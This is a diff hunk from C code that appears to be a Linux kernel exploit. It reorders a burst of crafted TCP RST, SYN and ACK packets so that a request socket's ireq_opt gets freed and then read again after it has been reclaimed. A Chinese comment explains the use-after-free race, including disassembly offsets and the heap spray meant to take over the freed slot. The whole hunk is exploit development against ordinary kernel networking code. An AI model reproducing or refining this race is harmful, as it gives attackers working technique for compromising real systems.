@@ -1403,10 +1403,26 @@ static void race_burst(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
     size_t al = build_pkt(ack, sport, isn + 1, peer_seq + 1, 0x10);
     size_t rl = build_pkt(rst, sport, isn + 1, peer_seq + 1, 0x04);
     size_t tl = build_pkt(rtx, sport, isn, 0, 0x02);
+
+    /* 先 RST 再 ACK —— 顺序是这轮改的关键。
+     *
+     * 之前是 ACK 在前，结果 ireq_opt 永远走不到释放：
+     *   tcp_v4_syn_recv_sock 在 +0x100 读到 ireq_opt，把它移交给 child
+     *   socket，然后立刻 str xzr, [req, #0x100] 置空（反汇编 0xed11b0）。
+     *   req 随后被回收，析构函数看到的是 NULL，kfree 不执行。
+     *   于是 kfree 从未发生，喷淋再准也没有可占的槽位 —— 这正是
+     *   hit 和 clear 双双为 0 的原因。
+     *
+     * 反过来先发 RST：req 还停在 SYN_RECV 队列里就被销毁，
+     * tcp_v4_reqsk_destructor 直接 kfree(req->ireq_opt)，槽位真正空出来。
+     * 紧接着的 SYN 让内核再建一个 req 并发 SYNACK，而哈希里可能还留着
+     * 刚被释放的那条 —— 读到的就是已回收的 ireq_opt。
+     *
+     * ACK 仍然保留在后面：它能补掉那些 RST 没打中的 req，避免队列堆积。 */
     for (int i = 0; i < RACE_BURST; i++) {
-        tx(ack, al);
         tx(rst, rl);
         tx(rtx, tl);
+        tx(ack, al);
     }
 }
 
